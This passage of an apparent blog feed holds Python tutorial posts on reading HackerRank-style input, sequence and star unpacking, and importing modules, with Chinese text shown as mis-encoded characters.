class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        student_marks = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            name, *line = <span class="built_in">input</span>().split()</span><br><span class="line">            scores = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">float</span>, line))</span><br><span class="line">            student_marks[name] = scores</span><br><span class="line">        query_name = <span class="built_in">input</span>()</span><br><span class="line">    ```</span><br><span class="line"></span><br><span class="line">    <span class="number">1.</span> å·²çŸ¥è¯»å…¥çš„æ•°æ®çš„ä¸ªæ•°ï¼Œå¯ä»¥ä½¿ç”¨ <span class="keyword">for</span> å¾ªç¯è¯»å–ï¼Œä½¿ç”¨ `_` ï¼ˆä¸€èˆ¬æŒ‡ä¸éœ€è¦ç”¨åˆ°çš„å˜é‡ï¼‰ä½œä¸ºæ¯æ¬¡è¿­ä»£çš„ç»“æœå˜é‡ã€‚</span><br><span class="line">    <span class="number">2.</span> ä½¿ç”¨ `<span class="built_in">input</span>().split()` å°†è¯»å…¥çš„ä¸€è¡Œä»¥ç©ºæ ¼ï¼ˆæˆ–åˆ¶è¡¨ç¬¦ï¼‰åˆ†éš”çš„å­—ç¬¦ä¸²ï¼ˆ `<span class="built_in">input</span>()` é‡åˆ°å›è½¦ç»“æŸï¼‰åˆ†è£‚ä¸ºå­—ç¬¦(ä¸²) åˆ—è¡¨ã€‚</span><br><span class="line">    <span class="number">3.</span> åœ¨å‡½æ•°åå‰åŠ  `*` ï¼Œ æ ‡è¯†å¯ä»¥æ¥å—å¤šå€¼ä½œä¸ºå…ƒç»„</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Problem <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">    [å¤„ç†è¾“å…¥ æ¡ˆä¾‹<span class="number">2</span>](https://www.hackerrank.com/challenges/find-second-maximum-number-<span class="keyword">in</span>-a-<span class="built_in">list</span>/problem):</span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">    score = [<span class="built_in">int</span>(n) <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">input</span>().split()][:num]</span><br><span class="line">    ```</span><br><span class="line"></span><br><span class="line">    æˆ–è€…</span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    score =<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split()))[:num]</span><br><span class="line">    ```</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> Problem <span class="number">3</span>:</span><br><span class="line"></span><br><span class="line">    [python3â€”â€”è¯»å–ä»¥ç©ºæ ¼åˆ†éš”çš„ä¸€è¡Œæ•´æ•°](https://blog.csdn.net/u013595395/article/details/<span class="number">88425996</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Problem <span class="number">4</span></span><br><span class="line"></span><br><span class="line">[Symmetric Difference](https://www.hackerrank.com/challenges/symmetric-difference/forum)</span><br><span class="line"></span><br><span class="line">å°†ä»¥ä¸‹è¾“å…¥çš„ç¬¬äºŒè¡Œå’Œç¬¬å››è¡Œåˆ†åˆ«è½¬æ¢ä¸ºå­—å…¸</span><br><span class="line"></span><br><span class="line">```txt</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">5</span> <span class="number">9</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">11</span> <span class="number">12</span></span><br></pre></td></tr></table></figure><p>æ–¹æ³•ï¼š<code>a,b = [set(input().split()) for _ in range(4)][1::2]</code></p><p>é¦–å…ˆä½¿ç”¨ for å¾ªç¯è¯»å–åˆ°åˆ—è¡¨ï¼Œç„¶åå–åˆ—è¡¨çš„ç¬¬ 2ï¼Œ4 é¡¹</p><h2 id="è¾“å‡ºæ¡ˆä¾‹">è¾“å‡ºæ¡ˆä¾‹</h2><ol type="1"><li>å°†å¤šä¸ªæ•°å­—åˆ—è¡¨ç©ºæ ¼åˆ†éš”è¾“å‡ºï¼Œç»“å°¾æ— ç©ºæ ¼,ä¸åŒåˆ—è¡¨ç”¨æ¢è¡Œåˆ†éš”</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot; &quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> xlist))</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ¨è">å‚è€ƒæ¨è</h2><p><a href="https://realpython.com/python-f-strings/">f-strings inPython 3 â€“ Formatted string literal</a> <ahref="https://blog.csdn.net/sunxb10/article/details/81036693">Pythonæ ¼å¼åŒ–å­—ç¬¦ä¸² f-string æ¦‚è§ˆ</a> <a href="https://pyformat.info/">PyFormatUsing % and .format() for great good!</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sequence unpacking</title>
      <link href="/blog/2020/03/22/programming/python/1.basic/7.seq_unpacking/"/>
      <url>/blog/2020/03/22/programming/python/1.basic/7.seq_unpacking/</url>
      
        <content type="html"><![CDATA[<p>Unpacking actually works with any object that happens to be iterable,not just <strong>tuples list or lists</strong>. This includes<strong>strings, files, iterators,and generators</strong>.</p><h2 id="basic">Basic</h2><p>åœ¨ç­‰å·å·¦è¾¹ä½¿ç”¨é€—å· comma <code>,</code>åˆ†éš”ä¸å³è¾¹åºåˆ—ä¸ªæ•°ç›¸åŒçš„å˜é‡æ¥æ¥å—æ”¶ä»–ä»¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">12</span>]: test_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">In [<span class="number">13</span>]: a,b,c = test_list</span><br><span class="line">In [<span class="number">17</span>]: <span class="built_in">print</span>(a,b,c)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line">In [<span class="number">22</span>]: test_dict=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">18</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: a, b = test_dict</span><br><span class="line"></span><br><span class="line">In [<span class="number">24</span>]: <span class="built_in">print</span>(a,b,sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">name</span><br><span class="line">age</span><br><span class="line"></span><br><span class="line">In [<span class="number">27</span>]: a, b = test_dict.items()</span><br><span class="line">In [<span class="number">28</span>]: a</span><br><span class="line">Out[<span class="number">28</span>]: (<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;zhangsan&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">30</span>]: a, b = test_dict.values()</span><br><span class="line">In [<span class="number">31</span>]: a</span><br><span class="line">Out[<span class="number">31</span>]: <span class="string">&#x27;zhangsan&#x27;</span></span><br></pre></td></tr></table></figure><p>Because <strong>parentheses of tuples can be omitted</strong>,multiple values can be assigned to multiple variables in one line asfollows.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">40</span>]: a, b = <span class="number">3</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">41</span>]: a</span><br><span class="line">Out[<span class="number">41</span>]: <span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">42</span>]: b</span><br><span class="line">Out[<span class="number">42</span>]: <span class="number">4</span></span><br></pre></td></tr></table></figure><p>An error occurs if the number of variables does not match the numberof elements.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">43</span>]: test_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">In [<span class="number">44</span>]: a,b = test_list</span><br><span class="line"> ValueError: too many values to unpack (expected <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">45</span>]: a,b,c,d = test_list</span><br><span class="line"> ValueError: <span class="keyword">not</span> enough values to unpack (expected <span class="number">4</span>, got <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>If the number of variables is less than the number of elements, it ispossible to add an asterisk <code>*</code> to the variable name andassign the remaining elements as a list. This will be describedlater.</p><h2 id="unpack-a-nested-tuple-and-list">Unpack a nested tuple andlist</h2><p>You can also unpack a nested tuple and list. If you want to expandthe inner element, enclose the variable with <code>()</code> or<code>[]</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">47</span>]: test_tuple = (<span class="number">0</span>,<span class="number">1</span>,(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">48</span>]: a, b, c = test_tuple</span><br><span class="line"></span><br><span class="line">In [<span class="number">49</span>]: <span class="built_in">print</span>(a,b,c, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">In [<span class="number">51</span>]: a, b, (c, d, e) = test_tuple</span><br><span class="line"></span><br><span class="line">In [<span class="number">52</span>]: <span class="built_in">print</span>(a,b,c,d,e, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><h2 id="unpack-using-_-underscore">Unpack using _ (underscore)</h2><p>By convention, unnecessary values may be assigned to underscores<code>_</code> in Python. It does not have a grammatical specialmeaning, but is simply assigned to a variable named <code>_</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">54</span>]: test = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">55</span>]: a, b, _ = test</span><br><span class="line">In [<span class="number">58</span>]: <span class="built_in">print</span>(a, b, _, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><p><strong>Notice</strong>ï¼švariables named <code>_</code> are not meantto be usedï¼Œ I print it here just to help you understand it in moredetail.</p><h2 id="unpack-using-asterisk">Unpack using * (asterisk)</h2><p>If the number of variables is less than the number of elements,adding an asterisk <code>*</code> to the variable name will assign theelements together as a list.</p><p>The elements from the beginning and the end are assigned to variableswithout <code>*</code>, and the remaining elements are assigned as a<strong>list</strong> to variables with <code>*</code>.</p><p>It is implemented in Python 3 and can not be used in Python 2.</p><p>Extended iterable unpacking is tailor-made for unpacking iterablesofunknown or arbitrary length.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">64</span>]: test</span><br><span class="line">Out[<span class="number">64</span>]: [<span class="number">62</span>, <span class="number">83</span>, <span class="number">93</span>, <span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">65</span>]: a, b, *c = test</span><br><span class="line"></span><br><span class="line">In [<span class="number">66</span>]: <span class="built_in">print</span>(a, b, c, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="number">62</span></span><br><span class="line"><span class="number">83</span></span><br><span class="line">[<span class="number">93</span>, <span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">67</span>]: a, *b, c = test</span><br><span class="line"></span><br><span class="line">In [<span class="number">68</span>]: <span class="built_in">print</span>(a, b, c, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="number">62</span></span><br><span class="line">[<span class="number">83</span>, <span class="number">93</span>]</span><br><span class="line"><span class="number">100</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">69</span>]: *a, b, c = test</span><br><span class="line"></span><br><span class="line">In [<span class="number">70</span>]: <span class="built_in">print</span>(a, b, c, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">[<span class="number">62</span>, <span class="number">83</span>]</span><br><span class="line"><span class="number">93</span></span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure><h2 id="usage">Usage</h2><p>Use unpacking When there are only some interesting elements in thespecific positions.</p><ol type="1"><li>when it is desired to assign only the first two elements of a tupleor a list to variables, the underscore _ may be used for unnecessaryparts.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">73</span>]: test</span><br><span class="line">Out[<span class="number">73</span>]: [<span class="number">62</span>, <span class="number">83</span>, <span class="number">93</span>, <span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">74</span>]: a, b, *_ = test</span><br><span class="line"></span><br><span class="line">In [<span class="number">75</span>]: <span class="built_in">print</span>(a, b, _, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="number">62</span></span><br><span class="line"><span class="number">83</span></span><br><span class="line">[<span class="number">93</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure><ol start="2" type="1"><li>The star syntax can be especially useful wheniterating over asequence of tuples of varying length</li></ol><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">records = [</span><br><span class="line">    (&#x27;foo&#x27;, 1, 2),</span><br><span class="line">    (&#x27;bar&#x27;, &#x27;hello&#x27;),</span><br><span class="line">    (&#x27;foo&#x27;, 3, 4),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def do_foo(x, y):</span><br><span class="line">    print(&#x27;foo&#x27;, x, y)</span><br><span class="line"></span><br><span class="line">def do_bar(s):</span><br><span class="line">    print(&#x27;bar&#x27;, s)</span><br><span class="line"></span><br><span class="line">for tag, *args in records:</span><br><span class="line">    if tag == &#x27;foo&#x27;:</span><br><span class="line">        do_foo(*args)</span><br><span class="line">    elif tag == &#x27;bar&#x27;:</span><br><span class="line">        do_bar(*args)</span><br></pre></td></tr></table></figure><ol start="3" type="1"><li>Star unpacking can also be useful when combined with certain kindsof string processing operations, such as splitting. For example:</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>line = <span class="string">&#x27;nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>uname, *fields, homedir, sh = line.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>uname</span><br><span class="line"><span class="string">&#x27;nobody&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>homedir</span><br><span class="line"><span class="string">&#x27;/var/empty&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sh</span><br><span class="line"><span class="string">&#x27;/usr/bin/false&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>Notice:</p><ol type="1"><li><p>You can add <code>*</code> to only one variable.</p><p>If there are multiple variables with <code>*</code>, it can not bedetermined how many elements are to be assigned, so<code>SyntaxError</code> occurs.</p></li><li><p>Assigned as a list Even if there is only one element assigned toa variable with *, it is assigned as a list. If there are no extraelements, an empty list is assigned.</p></li><li><p>It is also an error to use the starred expression as a loneassignment target, as in <code>*a = range(5)</code> This, however, isvalid syntax: <code>*a, = range(5)</code></p></li><li><p>this proposal also applies to tuples in implicit assignmentcontext, such as in a fortatement:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> a, *b <span class="keyword">in</span> [(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), (<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>)]:</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print out</span></span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure><ol start="5" type="1"><li>Starred expressions are <strong>only allowed as assignmenttargets</strong>, using them anywhere else (except for star-args infunction calls, of course) is an error.</li></ol><h2 id="iterable">iterable</h2><p>If the right-hand value is not a list, but an iterable, it has to beconverted to a list before being able to do slicing; to avoid creatingthis temporary list, one has to resort to</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">it = <span class="built_in">iter</span>(seq)</span><br><span class="line">first = it.<span class="built_in">next</span>()</span><br><span class="line">rest = <span class="built_in">list</span>(it)</span><br></pre></td></tr></table></figure><h2 id="multiple-function-arguments">Multiple Function Arguments</h2><p>Just mention it:</p><p>python ä¸­æœ‰ä¸¤ç§å¤šå€¼å‚æ•°ï¼š å‚æ•°åå‰å¢åŠ ä¸€ä¸ª <code>*</code>å¯ä»¥æ¥æ”¶å…ƒç»„, <code>*args</code> å‚æ•°åå‰å¢åŠ ä¸¤ä¸ª <code>*</code>å¯ä»¥æ¥æ”¶å­—å…¸, <code>**kwargs</code></p><p>å‚è€ƒæ¨è: <a href="https://www.python.org/dev/peps/pep-3132/">PEP3132 -- Extended Iterable Unpacking</a> <ahref="https://note.nkmk.me/en/python-tuple-list-unpack/">Unpack a tuple/ list in Python</a> <ahref="https://zhuanlan.zhihu.com/p/33896402">python æœ‰è¶£çš„è§£åŒ…ç”¨æ³•</a><ahref="https://learning.oreilly.com/library/view/python-cookbook-3rd/9781449357337/">PythonCookbook 3rd Edition</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python module and package</title>
      <link href="/blog/2020/03/22/programming/python/1.basic/10.module_and_packages/"/>
      <url>/blog/2020/03/22/programming/python/1.basic/10.module_and_packages/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¨¡å—å’ŒåŒ…">æ¨¡å—å’ŒåŒ…</h1><h2 id="ç›®æ ‡">ç›®æ ‡</h2><ul><li>æ¨¡å—</li><li>åŒ…</li><li>å‘å¸ƒæ¨¡å—</li></ul><h2 id="æ¨¡å—">01. æ¨¡å—</h2><h3 id="æ¨¡å—çš„æ¦‚å¿µ">1.1 æ¨¡å—çš„æ¦‚å¿µ</h3><blockquote><p><strong>æ¨¡å—æ˜¯ Python ç¨‹åºæ¶æ„çš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µ</strong></p></blockquote><ul><li>æ¯ä¸€ä¸ªä»¥æ‰©å±•å <code>py</code> ç»“å°¾çš„ <code>Python</code>æºä»£ç æ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ª <strong>æ¨¡å—</strong></li><li><strong>æ¨¡å—å</strong> åŒæ ·ä¹Ÿæ˜¯ä¸€ä¸ª<strong>æ ‡è¯†ç¬¦</strong>ï¼Œéœ€è¦ç¬¦åˆæ ‡è¯†ç¬¦çš„å‘½åè§„åˆ™</li><li>åœ¨æ¨¡å—ä¸­å®šä¹‰çš„ <strong>å…¨å±€å˜é‡</strong>ã€<strong>å‡½æ•°</strong>ã€<strong>ç±»</strong> éƒ½æ˜¯æä¾›ç»™å¤–ç•Œç›´æ¥ä½¿ç”¨çš„<strong>å·¥å…·</strong></li><li><strong>æ¨¡å—</strong> å°±å¥½æ¯”æ˜¯<strong>å·¥å…·åŒ…</strong>ï¼Œè¦æƒ³ä½¿ç”¨è¿™ä¸ªå·¥å…·åŒ…ä¸­çš„å·¥å…·ï¼Œå°±éœ€è¦å…ˆ<strong>å¯¼å…¥</strong> è¿™ä¸ªæ¨¡å—</li></ul><h3 id="æ¨¡å—çš„ä¸¤ç§å¯¼å…¥æ–¹å¼">1.2 æ¨¡å—çš„ä¸¤ç§å¯¼å…¥æ–¹å¼</h3><h4 id="import-å¯¼å…¥">1ï¼‰import å¯¼å…¥</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> æ¨¡å—å<span class="number">1</span>, æ¨¡å—å<span class="number">2</span></span><br></pre></td></tr></table></figure><blockquote><p>æç¤ºï¼šåœ¨å¯¼å…¥æ¨¡å—æ—¶ï¼Œæ¯ä¸ªå¯¼å…¥åº”è¯¥ç‹¬å ä¸€è¡Œ</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> æ¨¡å—å<span class="number">1</span></span><br><span class="line"><span class="keyword">import</span> æ¨¡å—å<span class="number">2</span></span><br></pre></td></tr></table></figure><ul><li>å¯¼å…¥ä¹‹å<ul><li>é€šè¿‡ <code>æ¨¡å—å.</code> ä½¿ç”¨ <strong>æ¨¡å—æä¾›çš„å·¥å…·</strong> â€”â€”<strong>å…¨å±€å˜é‡</strong>ã€<strong>å‡½æ•°</strong>ã€<strong>ç±»</strong></li></ul></li></ul><h5 id="ä½¿ç”¨-as-æŒ‡å®šæ¨¡å—çš„åˆ«å">ä½¿ç”¨ <code>as</code> æŒ‡å®šæ¨¡å—çš„åˆ«å</h5><blockquote><p><strong>å¦‚æœæ¨¡å—çš„åå­—å¤ªé•¿</strong>ï¼Œå¯ä»¥ä½¿ç”¨ <code>as</code>æŒ‡å®šæ¨¡å—çš„åç§°ï¼Œä»¥æ–¹ä¾¿åœ¨ä»£ç ä¸­çš„ä½¿ç”¨</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> æ¨¡å—å<span class="number">1</span> <span class="keyword">as</span> æ¨¡å—åˆ«å</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼š<strong>æ¨¡å—åˆ«å</strong> åº”è¯¥ç¬¦åˆ<strong>å¤§é©¼å³°å‘½åæ³•</strong></p></blockquote><h4 id="from...import-å¯¼å…¥">2ï¼‰from...import å¯¼å…¥</h4><ul><li>å¦‚æœå¸Œæœ› <strong>ä»æŸä¸€ä¸ªæ¨¡å—</strong> ä¸­ï¼Œå¯¼å…¥<strong>éƒ¨åˆ†</strong> å·¥å…·ï¼Œå°±å¯ä»¥ä½¿ç”¨ <code>from ... import</code>çš„æ–¹å¼</li><li><code>import æ¨¡å—å</code> æ˜¯ <strong>ä¸€æ¬¡æ€§</strong> æŠŠæ¨¡å—ä¸­<strong>æ‰€æœ‰å·¥å…·å…¨éƒ¨å¯¼å…¥</strong>ï¼Œå¹¶ä¸”é€šè¿‡ <strong>æ¨¡å—å/åˆ«å</strong>è®¿é—®</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä» æ¨¡å— å¯¼å…¥ æŸä¸€ä¸ªå·¥å…·</span></span><br><span class="line"><span class="keyword">from</span> æ¨¡å—å<span class="number">1</span> <span class="keyword">import</span> å·¥å…·å</span><br></pre></td></tr></table></figure><ul><li>å¯¼å…¥ä¹‹å<ul><li><strong>ä¸éœ€è¦</strong> é€šè¿‡ <code>æ¨¡å—å.</code></li><li>å¯ä»¥ç›´æ¥ä½¿ç”¨ <strong>æ¨¡å—æä¾›çš„å·¥å…·</strong> â€”â€”<strong>å…¨å±€å˜é‡</strong>ã€<strong>å‡½æ•°</strong>ã€<strong>ç±»</strong></li></ul></li></ul><p><strong>æ³¨æ„</strong></p><blockquote><p>å¦‚æœ <strong>ä¸¤ä¸ªæ¨¡å—</strong>ï¼Œå­˜åœ¨<strong>åŒåçš„å‡½æ•°</strong>ï¼Œé‚£ä¹ˆ <strong>åå¯¼å…¥æ¨¡å—çš„å‡½æ•°</strong>ï¼Œä¼š<strong>è¦†ç›–æ‰å…ˆå¯¼å…¥çš„å‡½æ•°</strong></p></blockquote><ul><li>å¼€å‘æ—¶ <code>import</code> ä»£ç åº”è¯¥ç»Ÿä¸€å†™åœ¨<strong>ä»£ç çš„é¡¶éƒ¨</strong>ï¼Œæ›´å®¹æ˜“åŠæ—¶å‘ç°å†²çª</li><li>ä¸€æ—¦å‘ç°å†²çªï¼Œå¯ä»¥ä½¿ç”¨ <code>as</code> å…³é”®å­—<strong>ç»™å…¶ä¸­ä¸€ä¸ªå·¥å…·èµ·ä¸€ä¸ªåˆ«å</strong></li></ul><h5 id="from...import-çŸ¥é“">from...import *ï¼ˆçŸ¥é“ï¼‰</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä» æ¨¡å— å¯¼å…¥ æ‰€æœ‰å·¥å…·</span></span><br><span class="line"><span class="keyword">from</span> æ¨¡å—å<span class="number">1</span> <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong></p><blockquote><p>è¿™ç§æ–¹å¼ä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºå‡½æ•°é‡åå¹¶æ²¡æœ‰ä»»ä½•çš„æç¤ºï¼Œå‡ºç°é—®é¢˜ä¸å¥½æ’æŸ¥</p></blockquote><h3 id="æ¨¡å—çš„æœç´¢é¡ºåºæ‰©å±•">1.3 æ¨¡å—çš„æœç´¢é¡ºåº[æ‰©å±•]</h3><p><code>Python</code> çš„è§£é‡Šå™¨åœ¨ <strong>å¯¼å…¥æ¨¡å—</strong> æ—¶ï¼Œä¼šï¼š</p><ol type="1"><li>æœç´¢ <strong>å½“å‰ç›®å½•</strong>æŒ‡å®šæ¨¡å—åçš„æ–‡ä»¶ï¼Œ<strong>å¦‚æœæœ‰å°±ç›´æ¥å¯¼å…¥</strong></li><li>å¦‚æœæ²¡æœ‰ï¼Œå†æœç´¢ <strong>ç³»ç»Ÿç›®å½•</strong></li></ol><blockquote><p>åœ¨å¼€å‘æ—¶ï¼Œç»™æ–‡ä»¶èµ·åï¼Œä¸è¦å’Œ 